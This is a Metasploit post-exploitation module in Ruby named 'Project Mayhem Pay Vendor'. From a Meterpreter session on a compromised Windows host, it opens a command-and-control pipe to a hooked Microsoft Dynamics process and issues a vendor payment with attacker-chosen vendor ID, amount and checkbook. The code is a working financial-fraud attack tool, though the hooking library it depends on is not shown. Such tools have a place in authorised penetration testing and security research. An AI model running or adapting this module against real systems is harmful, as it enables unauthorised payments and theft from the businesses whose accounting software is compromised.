##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/windows/project_mayhem'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::ProjectMayhem

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'Project Mayhem Pay Vendor',
			'Description'    => %q{
				Pay a vendor through a hooked Dynamics process.
			},
			'Author'        => 'Spencer McIntyre',
			'License'       => MSF_LICENSE,
			'Platform'      => [ 'win' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptString.new('VENDORID', [ false,  "Vendor to manipulate", 'MAYHEM']),
				OptInt.new('AMOUNT',      [ false,  "Amount to Pay", '31337']),
				OptString.new('CHECKBOOK', [ false, "Check book to issue the payment from", 'UPTOWN TRUST']),
			], self.class)
	end


	def run
		connect
		print_good("Opened a handle to the C&C pipe")
		parameters = {}
		parameters['vendor_id'] = datastore['VENDORID']
		parameters['amount'] = datastore['AMOUNT'].to_f.to_s
		parameters['checkbook'] = datastore['CHECKBOOK']

		begin
			execute_command('pay_vendor', parameters)
		rescue RuntimeError => ex
			print_error(ex.message)
			result = nil
		else
			print_good("Command completed successfully!")
		ensure
			disconnect
		end
	end
end
